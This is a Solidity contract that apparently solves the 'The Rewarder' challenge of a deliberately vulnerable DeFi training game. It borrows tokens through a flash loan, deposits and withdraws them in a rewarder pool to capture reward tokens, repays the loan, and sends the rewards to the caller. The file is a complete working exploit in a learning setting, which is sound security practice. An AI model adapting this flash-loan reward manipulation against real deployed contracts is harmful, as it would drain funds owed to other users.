// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";

contract TheRewarderAttacker {
    address private flashLoanerPool;
    address private rewarderPool;
    IERC20 private damnValuableToken;
    IERC20 private rewardToken;

    constructor(
        address _flashLoanerPool,
        address _rewarderPool,
        address _damnValuableToken,
        address _rewardToken
    ) {
        flashLoanerPool = _flashLoanerPool;
        rewarderPool = _rewarderPool;
        damnValuableToken = IERC20(_damnValuableToken);
        rewardToken = IERC20(_rewardToken);
    }

    function receiveFlashLoan(uint256 amount) external {
        console.log("attacker here 1");
        damnValuableToken.approve(rewarderPool, amount);
        console.log("attacker here 2");
        (bool isSuccess, ) = rewarderPool.call(
            abi.encodeWithSignature("deposit(uint256)", amount)
        );
        console.log("attacker here 3");
        require(isSuccess, "deposit failed");
        console.log("attacker here 4");

        (bool isSuccessWithdraw, ) = rewarderPool.call(
            abi.encodeWithSignature("withdraw(uint256)", amount)
        );
        console.log("attacker here 5: %s", isSuccessWithdraw);
        require(isSuccessWithdraw, "withdraw failed");

        bool isSuccessTransfer = damnValuableToken.transfer(
            flashLoanerPool,
            amount
        );
        console.log("attacker here 6: %s", isSuccessTransfer);
        require(isSuccessTransfer, "transfer back failed");

        uint256 balance = rewardToken.balanceOf(address(this));
        console.log("attacker here 7: rewardToken: %s", balance);
        rewardToken.transfer(tx.origin, balance);
    }

    function attack(uint256 amount) external {
        (bool isSuccess, ) = flashLoanerPool.call(
            abi.encodeWithSignature("flashLoan(uint256)", amount)
        );
        require(isSuccess, "attack flashloan failed");
    }
}
